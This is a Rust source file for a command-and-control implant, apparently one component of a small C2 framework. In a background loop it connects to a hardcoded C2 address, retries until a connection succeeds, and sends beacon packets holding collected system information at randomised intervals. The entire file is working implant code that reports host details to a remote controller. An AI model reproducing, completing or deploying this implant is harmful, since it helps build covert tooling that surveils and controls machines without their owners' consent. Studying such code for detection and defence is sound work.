use std::{
    io::Write,
    net::TcpStream,
    thread::{self, sleep},
    time::Duration,
};

const C2_ADDRESS: &str = "127.0.0.1:9120";

use common::{IMPLANT_REPORT_RATE_SECONDS, Packet, SystemInfo, encode};
use rand::{Rng, rng};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let beacon_thead = thread::spawn(move || {
        loop {
            connect()
                .write(
                    encode(Packet::Beacon {
                        system_info: SystemInfo::get(),
                    })
                    .unwrap()
                    .as_slice(),
                )
                .unwrap();

            sleep(Duration::from_secs(
                rng().random_range(IMPLANT_REPORT_RATE_SECONDS),
            ));
        }
    });

    beacon_thead.join().unwrap();

    Ok(())
}

fn connect() -> TcpStream {
    loop {
        let stream = TcpStream::connect(C2_ADDRESS);
        if stream.is_err() {
            println!("Failed to estabilish a connection to the C2, retrying in a minute...");
            sleep(Duration::from_secs(if cfg!(debug_assertions) {
                10
            } else {
                60
            }));
            continue;
        }

        return stream.unwrap();
    }
}
